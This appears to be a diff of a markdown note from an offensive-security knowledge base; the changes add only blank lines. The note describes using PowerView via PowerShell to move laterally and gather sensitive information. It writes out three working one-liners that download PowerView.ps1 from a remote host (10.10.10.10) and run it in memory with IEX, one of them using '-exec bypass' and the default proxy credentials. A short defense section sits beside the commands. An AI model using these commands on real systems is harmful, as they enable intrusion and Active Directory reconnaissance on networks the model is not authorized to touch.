@@ -30,6 +30,8 @@ Technical Description: PowerView can be used to download and execute PowerShell 
 
 Business Value: This procedure can be used by attackers to gain sensitive information and move laterally within the network. By using PowerShell, attackers can evade traditional security measures and perform various malicious activities without being detected.
 
+ 
+
 ## Requirements
 
 1. Access to PowerShell on the target system.
@@ -37,6 +39,8 @@ Business Value: This procedure can be used by attackers to gain sensitive inform
 1. Remote access to the target system.
 
 1. PowerView PowerShell tool.
+
+ 
 
 ## Defense
 
@@ -46,6 +50,8 @@ Business Value: This procedure can be used by attackers to gain sensitive inform
 
 1. Implement application whitelisting to prevent unauthorized PowerShell scripts from running.
 
+ 
+
 ## Objectives
 
 1. Download and execute PowerShell scripts on the target system.
@@ -54,18 +60,28 @@ Business Value: This procedure can be used by attackers to gain sensitive inform
 
 1. Move laterally within the network.
 
+ 
+
 # Instructions
 
 1. This command downloads and executes the PowerView PowerShell script from a remote server. It includes two different methods, one for proxy-aware systems and one for non-proxy aware systems.
+
+ 
+
+
 
 **Code**: [[# Download and execute PowerView
 
 # Proxy-aware
 IE]]
 
+
+
 > The first method uses the IEX (Invoke-Expression) cmdlet to download and execute the script. It first downloads the script using the WebClient object and then executes it using PowerShell. It also includes a command to output the script to the console.
 
 The second method is for systems that are not proxy-aware and uses the WinHttpRequest COM object to download the script and then executes it using PowerShell. The $false parameter is used to indicate that the request should not use a proxy server.
+
+
 
 **Command** ([[Download and execute PowerView (Proxy-Aware)]]):
 
@@ -75,11 +91,17 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"
 ```
 
+
+
+
+
 **Command** ([[Download and execute PowerView (Non-Proxy Aware)]]):
 
 ```bash
 $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
 ```
+
+
 
 ## Commands Used
 
@@ -90,3 +112,5 @@ $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/
 
 - [[Load Powershell scripts]]
 - [[Powershell]]
+
+
